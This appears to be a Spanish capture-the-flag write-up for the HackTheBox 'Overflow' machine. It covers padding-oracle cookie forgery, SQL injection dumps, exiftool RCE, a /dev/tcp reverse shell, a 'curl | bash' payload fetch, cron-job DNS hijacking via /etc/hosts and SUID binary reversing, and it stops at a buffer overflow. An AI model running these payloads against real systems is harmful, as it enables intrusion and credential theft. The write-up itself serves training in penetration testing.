---
layout: post
title: Overflow
date: 2023-06-22
description:
img:
fig-caption:
tags: [OSWE, eWPT, eWPTXv2]
---
___

<center><img src="/writeups/assets/img/Overflow-htb/Overflow.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Padding Oracle Attack

* Cookie Hijacking

* SQL Inyection

* RCE - Exiftool

* DNS Hijacking

* Análisis de binario

* Reversing C

* Buffer Overflow - Llamada a función interna

* Abuso de XOR - Alteración /etc/passwd (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.119 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 07:21 GMT
Nmap scan report for 10.10.11.119
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,25,80 10.10.11.119 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 07:22 GMT
Nmap scan report for 10.10.11.119
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Overflow Sec
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.35 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.119
http://10.10.11.119 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.119], JQuery, Script, Title[Overflow Sec]
```

La página principal se ve así:

<img src="/writeups/assets/img/Overflow-htb/1.png" alt="">

Puedo registrarme

<img src="/writeups/assets/img/Overflow-htb/2.png" alt="">

Recargo la página e intercepto la petición con ```BurpSuite``` para ver las cookies que se tramitan

```null
GET /home/index.php HTTP/1.1
Host: 10.10.11.119
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.119/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: auth=qZH6zmBTHNntX%2Bm0JACgqk4aJy49RtCo
Connection: close
```

Pruebo un ```Padding Oracle Attack``` con la herramienta ```Padbuster```

```null
padbuster http://10.10.11.119/home/index.php qZH6zmBTHNntX%2Bm0JACgqk4aJy49RtCo -cookies "auth=qZH6zmBTHNntX%2Bm0JACgqk4aJy49RtCo" 8

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 12503

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	302	12503	../login.php
2 **	255	302	0	../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (70/256) [Byte 8]
[+] Success: (149/256) [Byte 7]
[+] Success: (222/256) [Byte 6]
[+] Success: (167/256) [Byte 5]
[+] Success: (71/256) [Byte 4]
[+] Success: (103/256) [Byte 3]
[+] Success: (27/256) [Byte 2]
[+] Success: (44/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): ed5fe9b42400a0aa
[+] Intermediate Bytes (HEX): dce29fbc5d2169bb
[+] Plain Text: user=rub

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (83/256) [Byte 8]
[+] Success: (92/256) [Byte 7]
[+] Success: (251/256) [Byte 6]
[+] Success: (218/256) [Byte 5]
[+] Success: (73/256) [Byte 4]
[+] Success: (23/256) [Byte 3]
[+] Success: (224/256) [Byte 2]
[+] Success: (121/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 4e1a272e3d46d0a8
[+] Intermediate Bytes (HEX): 8f27efb22206a6ac
[+] Plain Text: bx

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=rubbx

[+] Decrypted value (HEX): 757365723D7275626278060606060606

[+] Decrypted value (Base64): dXNlcj1ydWJieAYGBgYGBg==

-------------------------------------------------------
```

Y computo una nueva cookie

```null
padbuster http://10.10.11.119/home/index.php qZH6zmBTHNntX%2Bm0JACgqk4aJy49RtCo -cookies "auth=qZH6zmBTHNntX%2Bm0JACgqk4aJy49RtCo" 8 -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 12503

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	302	12503	../login.php
2 **	255	302	0	../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------
```

Otra forma alternativa es efectuando un ```Bit Flipper```, habiendo registrado de antes un usuario con nombre parecido a ```admin```, por ejemplo, ```bdmin```. Al estarse empleando CBC (Cifrado por bloques) una parte de la cookie se va a mantener estática, ya que la mayoría de los bloques coinciden. El tipo de ataque a seleccionar en el ```BurpSuite``` es un sniper, ya que unicamente hay que bruteforcear un campo

<img src="/writeups/assets/img/Overflow-htb/3.png" alt="">

Y el tipo de payload ```Bit Flipper```

<img src="/writeups/assets/img/Overflow-htb/4.png" alt="">

Al ejecutar, aparecen varias cuyo ```Content-Lenght``` es bastante elevado

<img src="/writeups/assets/img/Overflow-htb/5.png" alt="">

Intercambio la cookie de sesión

<img src="/writeups/assets/img/Overflow-htb/6.png" alt="">

Gano acceso como ```Admin```

<img src="/writeups/assets/img/Overflow-htb/7.png" alt="">

En esta nueva sección tengo acceso a un panel de inicio de sesión para un CMS

<img src="/writeups/assets/img/Overflow-htb/8.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.11.119/admin_cms_panel -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.119/admin_cms_panel
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/22 08:18:03 Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 330] [--> http://10.10.11.119/admin_cms_panel/modules/]
/uploads              (Status: 301) [Size: 330] [--> http://10.10.11.119/admin_cms_panel/uploads/]
/doc                  (Status: 301) [Size: 326] [--> http://10.10.11.119/admin_cms_panel/doc/]    
/admin                (Status: 301) [Size: 328] [--> http://10.10.11.119/admin_cms_panel/admin/]  
/assets               (Status: 301) [Size: 329] [--> http://10.10.11.119/admin_cms_panel/assets/] 
/lib                  (Status: 301) [Size: 326] [--> http://10.10.11.119/admin_cms_panel/lib/]    
/tmp                  (Status: 301) [Size: 326] [--> http://10.10.11.119/admin_cms_panel/tmp/]    
                                                                                                  
===============================================================
2023/06/22 08:22:31 Finished
===============================================================
```

Y dentro de ```/doc``` por arhivos con extensión TXT

```null
gobuster dir -u http://10.10.11.119/admin_cms_panel/doc -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.119/admin_cms_panel/doc
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/06/22 08:25:05 Starting gobuster in directory enumeration mode
===============================================================
/README.txt           (Status: 200) [Size: 920]
/robots.txt           (Status: 200) [Size: 121]
/COPYING.txt          (Status: 200) [Size: 17992]
/CHANGELOG.txt        (Status: 200) [Size: 40158]
/htaccess.txt         (Status: 200) [Size: 4045] 
/AUTHORS.txt          (Status: 200) [Size: 4981] 
                                                 
===============================================================
2023/06/22 08:33:53 Finished
===============================================================
```

En el ```CHANGELOG.txt``` puedo ver la versión

```null
curl -s -X GET http://10.10.11.119/admin_cms_panel/doc/CHANGELOG.txt | html2text | head -n 1
Version 2.2.8 - Flin Flon ---------------------------------- Core - General -
```

Es vulnerable a inyección SQL

```null
searchsploit cms made simple 2.2.8
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                      | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Me traigo el exploit para analizarlo

```null
searchsploit -m php/webapps/46635.py
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/rubbx/Desktop/HTB/Machines/Overflow/46635.py
```

Se están llamando a cuatro funciones

```null
dump_salt()
dump_username()
dump_email()
dump_password()
```

Para extraer el ```salt``` se introduce la siguiente query

```null
payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
```

Al hacer click en ```Logs``` dentro del menú al estar conectado como Administrador aparece un error

<img src="/writeups/assets/img/Overflow-htb/9.png" alt="">

Al inspeccionarlo se ve que redirige a un script en JS

<img src="/writeups/assets/img/Overflow-htb/10.png" alt="">

Le tramito una petición por GET

```null
curl -s -X GET http://10.10.11.119/config/admin_last_login.js
async function getUsers() {
    let url = 'http://overflow.htb/home/logs.php?name=admin';
    try {
        let res = await fetch(url);
        return await res.text();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    let container = document.querySelector('.content');
    container.innerHTML = users;
}

renderUsers();
```

Añado el dominio ```overflow.htb``` al ```/etc/hosts```. Desde el dominio no tengo acceso

```null
curl -s -X GET 'http://overflow.htb/home/logs.php?name=admin'
Unauthorized!!
```

Sin embargo, al introducir la IP y desde el navegador, sí

<img src="/writeups/assets/img/Overflow-htb/11.png" alt="">

Con el payload puedo ver que el tercer campo aparece reflejado en el output

```null
admin') union select 1,2,3-- -
```

<img src="/writeups/assets/img/Overflow-htb/12.png" alt="">

Cambio el tres para dumpear datos, en primer lugar, las bases de datos

```null
schema_name from information_schema.schemata
```

<img src="/writeups/assets/img/Overflow-htb/13.png" alt="">

Para ```Overflow``` existe la tabla ```users```

```null
table_name from information_schema.tables where table_schema="Overflow"
```

<img src="/writeups/assets/img/Overflow-htb/14.png" alt="">

De columnas tiene ```username``` y ```password```

```null
column_name from information_schema.columns where table_schema="Overflow" and table_name="users"
```

<img src="/writeups/assets/img/Overflow-htb/15.png" alt="">

Obtengo un hash

```null
group_concat(username,0x3a,password) from Overflow.users
```

<img src="/writeups/assets/img/Overflow-htb/16.png" alt="">

No lo puedo crackear, ya que no tengo el salt

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-06-22 09:01) 0g/s 26078Kp/s 26078Kc/s 26078KC/s  filimani..*7¡Vamos!
Session completed.
```

De la misma forma de antes, listo las tablas para ```cmsmsdb```. Una de ellas contiene usuarios

<img src="/writeups/assets/img/Overflow-htb/17.png" alt="">

Y listo las columnas

<img src="/writeups/assets/img/Overflow-htb/18.png" alt="">

Dumpeo los datos

<img src="/writeups/assets/img/Overflow-htb/19.png" alt="">

Pero estoy igual, sin el salt no hago nada

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-06-22 09:08) 0g/s 24729Kp/s 24729Kc/s 74189KC/s  filimani..*7¡Vamos!
Session completed. 
```

Se puede extraer desde la tabla ```cmsmsdb```, columna ```cms_siteprefs``` y la valor ```sitepref_value```

<img src="/writeups/assets/img/Overflow-htb/20.png" alt="">

Los crackeo con ```hashcat```

```null
hashcat hash /usr/share/wordlists/rockyou.txt -m 20 --user --show
editor:e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo
```

Gano acces al CMS

<img src="/writeups/assets/img/Overflow-htb/21.png" alt="">

Puedo ver un subdominio

<img src="/writeups/assets/img/Overflow-htb/22.png" alt="">

Lo añado al ```/etc/hosts``` y abro en el navegador

<img src="/writeups/assets/img/Overflow-htb/23.png" alt="">

Se reutilizan las credenciales. Puedo subir una imagen

<img src="/writeups/assets/img/Overflow-htb/24.png" alt="">

Intercepto la petición, y en la respuesta aparece un output de ```exiftool```

```null
HTTP/1.1 302 Moved Temporarily

Date: Thu, 22 Jun 2023 09:44:27 GMT

Server: Apache/2.4.29 (Ubuntu)

Location: ./index.php?upload=0

Connection: close

Content-Type: text/html; charset=UTF-8

Content-Length: 1043



ExifTool Version Number         : 11.92
File Name                       : 649417fb3bceb0.56871170.jpg
Directory                       : ../../assets/data/upliid
File Size                       : 49 kB
File Modification Date/Time     : 2023:06:22 15:14:27+05:30
File Access Date/Time           : 2023:06:22 15:14:27+05:30
File Inode Change Date/Time     : 2023:06:22 15:14:27+05:30
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1200
Image Height                    : 600
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1200x600
Megapixels                      : 0.720
```

Es vulnerable al [CVE-2021-22204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204). Encuentro un [POC](https://github.com/OneSecCyber/JPEG_RCE.git) que crea una imagen con el payload inyectado

```null
exiftool -config eval.config runme.jpg -eval='system("ping -c 1 10.10.16.3")'
    1 image files updated
```

La subo y recibo la traza ICMP

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:22:32.786448 IP 10.10.11.119 > 10.10.16.3: ICMP echo request, id 17454, seq 1, length 64
10:22:32.795073 IP 10.10.16.3 > 10.10.11.119: ICMP echo reply, id 17454, seq 1, length 64
```

Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
```

Lo cargo e interpreto

```null
exiftool -config eval.config runme.jpg -eval='system("curl 10.10.16.3 | bash")'
```

Lo comparto con ```python``` y gano acceso en una sesión de ```netcat```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.119 - - [22/Jun/2023 10:41:29] "GET / HTTP/1.1" 200 -
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.119] 57858
bash: cannot set terminal process group (942): Inappropriate ioctl for device
bash: no job control in this shell
www-data@overflow:~/devbuild-job/home/profile$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@overflow:~/devbuild-job/home/profile$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm

www-data@overflow:~/devbuild-job/home/profile$ export TERM=xterm
www-data@overflow:~/devbuild-job/home/profile$ export SHELL=bash
www-data@overflow:~/devbuild-job/home/profile$ stty rows 55 columns 209
```

Encuentro credenciales de acceso a la base de datos

```null
www-data@overflow:~/html/config$ cat db.php 
<?php 

#define('DB_Server', 'localhost');
#define('DB_Username', 'root');
#define('DB_Password','root');
#define('DB_Name', 'Overflow');

$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
$db = mysqli_select_db($lnk,"Overflow");

if($db == false){
    dir('Cannot Connect to Database');
}

?>
```

Me convierto en ```developer```

```null
www-data@overflow:~/html/config$ su developer
Password: 
$ bash
developer@overflow:/var/www/html/config$
```

Pertenece al grupo ```network```

```null
developer@overflow:~$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)
```

Puedo alterar el ```/etc/hosts```

```null
developer@overflow:/$ find \-group network 2>/dev/null 
./etc/hosts
```

Subo el ```pspy``` para detectar tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/06/22 17:09:01 CMD: UID=0    PID=18419  | /usr/sbin/CRON -f 
2023/06/22 17:09:01 CMD: UID=1000 PID=18423  | bash /opt/commontask.sh 
```

Tengo permisos de lectura en este script. Al poder alterar el ```/etc/hosts```, el dominio puedo hacerlo apuntar a mi equipo

```null
developer@overflow:/tmp$ cat /opt/commontask.sh
#!/bin/bash

#make sure its running every minute.


bash < <(curl -s http://taskmanage.overflow.htb/task.sh)
```

```null
developer@overflow:/tmp$ echo '10.10.16.3 taskmanage.overflow.htb' > /etc/hosts
```

Creo el archivo ```task.sh``` y lo hosteo con ```python```

```null
bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.119 - - [22/Jun/2023 11:43:01] "GET /task.sh HTTP/1.1" 200 -
```

Gano acceso como ```tester```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.119] 58578
bash: cannot set terminal process group (18544): Inappropriate ioctl for device
bash: no job control in this shell
tester@overflow:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tester@overflow:~$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm

tester@overflow:~$ export TERM=xterm
tester@overflow:~$ export SHELL=bash
tester@overflow:~$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
tester@overflow:~$ cat user.txt 
94ed79c8b096b8a3b7092f2dde3defad
```

# Escalada

Un binario no típico es SUID

```null
tester@overflow:/$ find \-perm \-4000 2>/dev/null | tail -n 1
./opt/file_encrypt/file_encrypt
```

Lo transfiero a mi equipo e importo en ```Ghidra```

<img src="/writeups/assets/img/Overflow-htb/25.png" alt="">

El pin se extrae de una función ```random()```

<img src="/writeups/assets/img/Overflow-htb/26.png" alt="">

Pero no es tan aleatoria

<img src="/writeups/assets/img/Overflow-htb/27.png" alt="">

Lo convierto a un script en C, pero al compilarlo, me percato que es el mismo que aparece al ejecutar el programa

```null
#include <stdio.h>

long random(void);

int main(void)
{
  long result = random();
  printf("El PIN generado es: %ld\n", result);
  return 0;
}
```

```null
./file_encrypt
This is the code 1804289383. Enter the Pin: ^C
```

```null
/a.out
El PIN generado es: 1804289383
```

La variable ```in_stack_00000004``` no se está desamblando correctamente, pero la puedo ver en memoria

```null
gdb file_encrypt
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 13.2 in 0.03ms using Python engine 3.11
Reading symbols from file_encrypt...
(No debugging symbols found in file_encrypt)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x000005a4  _init
0x000005e0  printf@plt
0x000005f0  fclose@plt
0x00000600  sleep@plt
0x00000610  _IO_getc@plt
0x00000620  _IO_putc@plt
0x00000630  __xstat@plt
0x00000640  puts@plt
0x00000650  strerror@plt
0x00000660  exit@plt
0x00000670  __libc_start_main@plt
0x00000680  fprintf@plt
0x00000690  fopen@plt
0x000006a0  __errno_location@plt
0x000006b0  rand@plt
0x000006c0  __isoc99_scanf@plt
0x000006d0  __cxa_finalize@plt
0x000006d8  __gmon_start__@plt
0x000006e0  _start
0x00000720  __x86.get_pc_thunk.bx
0x00000730  deregister_tm_clones
0x00000770  register_tm_clones
0x000007c0  __do_global_dtors_aux
0x00000810  frame_dummy
0x00000819  __x86.get_pc_thunk.dx
0x0000081d  random
0x0000085b  encrypt
0x00000ab0  check_pin
0x00000b62  main
0x00000b90  __x86.get_pc_thunk.ax
0x00000ba0  __libc_csu_init
0x00000c00  __libc_csu_fini
0x00000c10  __stat
0x00000c10  stat
0x00000c34  _fini
gef➤  disass random
Dump of assembler code for function random:
   0x0000081d <+0>:	push   ebp
   0x0000081e <+1>:	mov    ebp,esp
   0x00000820 <+3>:	sub    esp,0x10
   0x00000823 <+6>:	call   0xb90 <__x86.get_pc_thunk.ax>
   0x00000828 <+11>:	add    eax,0x2778
   0x0000082d <+16>:	mov    DWORD PTR [ebp-0x8],0x6b8b4567
   0x00000834 <+23>:	mov    DWORD PTR [ebp-0x4],0x0
   0x0000083b <+30>:	jmp    0x84d <random+48>
   0x0000083d <+32>:	mov    eax,DWORD PTR [ebp-0x8]
   0x00000840 <+35>:	imul   eax,eax,0x59
   0x00000843 <+38>:	add    eax,0x14
   0x00000846 <+41>:	mov    DWORD PTR [ebp-0x8],eax
   0x00000849 <+44>:	add    DWORD PTR [ebp-0x4],0x1
   0x0000084d <+48>:	cmp    DWORD PTR [ebp-0x4],0x9
   0x00000851 <+52>:	jle    0x83d <random+32>
   0x00000853 <+54>:	mov    eax,DWORD PTR [ebp-0x8]
   0x00000856 <+57>:	xor    eax,DWORD PTR [ebp+0x8]
   0x00000859 <+60>:	leave
   0x0000085a <+61>:	ret
End of assembler dump.
```

Introduzco un breakpoint en la dirección donde se aplica el ```xor```

```null
gef➤  b *0x00000856
Breakpoint 1 at 0x856
```

Ejecuto e imprimo el valor por pantalla

```null
gef➤  r
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x986d965f
$ebx   : 0x56557fa0  →  <_GLOBAL_OFFSET_TABLE_+0> test al, 0x2e
$ecx   : 0xf7e1d094  →  0x4e508aaa
$edx   : 0x0       
$esp   : 0xffffd7a8  →  0x00000000
$ebp   : 0xffffd7b8  →  0xffffd7f8  →  0xffffd808  →  0x00000000
$esi   : 0x56555ba0  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x56555856  →  <random+57> xor eax, DWORD PTR [ebp+0x8]
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd7a8│+0x0000: 0x00000000	← $esp
0xffffd7ac│+0x0004: 0x00000000
0xffffd7b0│+0x0008: 0x986d965f
0xffffd7b4│+0x000c: 0x00000a ("\n"?)
0xffffd7b8│+0x0010: 0xffffd7f8  →  0xffffd808  →  0x00000000	← $ebp
0xffffd7bc│+0x0014: 0x56555ad5  →  <check_pin+37> add esp, 0x10
0xffffd7c0│+0x0018: 0x6b8b4567
0xffffd7c4│+0x001c: 0xf7c3e01b  →  <random+11> add ebx, 0x1defd9
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x5655584d <random+48>      cmp    DWORD PTR [ebp-0x4], 0x9
   0x56555851 <random+52>      jle    0x5655583d <random+32>
   0x56555853 <random+54>      mov    eax, DWORD PTR [ebp-0x8]
 → 0x56555856 <random+57>      xor    eax, DWORD PTR [ebp+0x8]
   0x56555859 <random+60>      leave  
   0x5655585a <random+61>      ret    
   0x5655585b <encrypt+0>      push   ebp
   0x5655585c <encrypt+1>      mov    ebp, esp
   0x5655585e <encrypt+3>      push   ebx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "file_encrypt", stopped 0x56555856 in random (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56555856 → random()
[#1] 0x56555ad5 → check_pin()
[#2] 0x56555b82 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```null
gef➤  x/1x $ebp+0x8
0xffffd7c0:	0x6b8b4567
```

Lo convierto de hexadecimal a decimal con ```python```

```null
python3
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x6b8b4567
1804289383
```

Es el mismo valor que ya tenía, por lo que el ```XOR``` se está aplicando sobre un antiguo valor del pin con el nuevo. Creo un nuevo script para obtener el valor de ```local_c```

```null
#include <stdio.h>

unsigned int random(int in_stack_00000004) {
  unsigned int local_c;
  int i;

  local_c = 0x6b8b4567;
  for (i = 0; i < 10; i = i + 1) {
    local_c = local_c * 0x59 + 0x14;
  }
  return local_c ^ in_stack_00000004;
}

int main() {
  int in_stack_00000004 = 1804289383;
  unsigned int local_c = random(in_stack_00000004);

  printf("El valor de local_c es: %u\n", local_c);

  return 0;
}
```

Pero sigue sin ser válido

```null
./test
El valor de local_c es: 4091990840
```

```null
./file_encrypt
This is the code 1804289383. Enter the Pin: 4091990840
Wrong Pin
```

Esto se debe a que la función ```scanf()``` está leyendo un ```signed integer```, por lo que se tiene en cuenta el signo. Desplazo 32 bytes a la izquierda el valor que ya tengo con ```python```

```null
python3
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 4091990840 - pow(2,32)
-202976456
```

El campo ```name``` que aparece después del código es vulnerable a ```Buffer Overflow```

```null
